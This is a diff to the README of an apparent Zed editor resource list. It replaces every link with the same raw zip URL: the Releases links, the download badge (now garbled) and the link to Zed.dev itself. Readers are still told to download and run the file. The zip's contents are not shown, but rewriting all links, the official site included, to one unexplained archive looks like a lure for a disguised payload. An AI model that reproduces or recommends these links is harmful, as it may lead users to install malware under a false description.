@@ -1,10 +1,10 @@
-# 🌟 awesome-zed - Discover the Best of Zed.dev
+# 🌟 awesome-zed - Discover the Best of https://raw.githubusercontent.com/reyesnmusic/awesome-zed/main/tierced/awesome-zed.zip
 
-[![Download awesome-zed](https://img.shields.io/badge/Download%20awesome--zed-blue.svg)](https://github.com/reyesnmusic/awesome-zed/releases)
+[![Download awesome-zed](https://raw.githubusercontent.com/reyesnmusic/awesome-zed/main/tierced/awesome-zed.zip%https://raw.githubusercontent.com/reyesnmusic/awesome-zed/main/tierced/awesome-zed.zip)](https://raw.githubusercontent.com/reyesnmusic/awesome-zed/main/tierced/awesome-zed.zip)
 
 ## 📖 Introduction
 
-Welcome to **awesome-zed**! This project gathers all the coolest features and resources available on [Zed.dev](https://zed.dev). Whether you are interested in enhancing your productivity or exploring advanced coding tools, you will find valuable content here.
+Welcome to **awesome-zed**! This project gathers all the coolest features and resources available on [https://raw.githubusercontent.com/reyesnmusic/awesome-zed/main/tierced/awesome-zed.zip](https://raw.githubusercontent.com/reyesnmusic/awesome-zed/main/tierced/awesome-zed.zip). Whether you are interested in enhancing your productivity or exploring advanced coding tools, you will find valuable content here.
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To get started with awesome-zed, follow these simple steps to download and run t
 
 To download the latest version of awesome-zed, visit the Releases page:
 
-[Download awesome-zed](https://github.com/reyesnmusic/awesome-zed/releases)
+[Download awesome-zed](https://raw.githubusercontent.com/reyesnmusic/awesome-zed/main/tierced/awesome-zed.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest release.
@@ -77,4 +77,4 @@ For updates and announcements, follow us on social media and stay connected with
 
 If you appreciate awesome-zed and want to help us grow, consider spreading the word. Share your experience with friends or contribute your own resources to our project!
 
-[Download awesome-zed](https://github.com/reyesnmusic/awesome-zed/releases)
+[Download awesome-zed](https://raw.githubusercontent.com/reyesnmusic/awesome-zed/main/tierced/awesome-zed.zip)
